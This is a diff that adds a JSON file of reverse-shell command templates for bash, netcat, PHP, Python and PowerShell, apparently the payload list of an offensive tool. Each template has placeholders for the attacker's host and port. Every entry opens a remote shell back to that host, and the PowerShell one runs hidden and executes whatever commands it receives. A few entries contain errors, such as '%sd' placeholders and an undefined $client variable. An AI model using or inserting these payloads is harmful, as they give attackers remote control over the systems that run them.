@@ -1,0 +1,8 @@
+{
+        "bash":["bash -i >& /dev/tcp/%s/%s 0>&1","0<&196;exec 196<>/dev/tcp/%s/%s; sh <&196 >&196 2>&196","/bin/bash -l > /dev/tcp/%sd/%sd 0<&1 2>&1"],
+        "netcat":["rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f","nc -e /bin/sh %s %s","nc -e /bin/bash %s %s"],
+        "php":["php -r \"'$sock=fsockopen(%s,%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");'\"","php -r \"'$sock=fsockopen(%s,%s);$proc=proc_open(\"/bin/sh -i\", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);'\""],
+        "python":["python -c 'a=__import__;s=a(\"socket\").socket;o=a(\"os\").dup2;p=a(\"pty\").spawn;c=s();c.connect((%s,%s));f=c.fileno;o(f(),0);o(f(),1);o(f(),2);p(/bin/sh)'"],
+        "powershell":["powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(%s,%s);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2  = $sendback + \"PS\" + (pwd).Path + \"> \";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"]
+        }
+
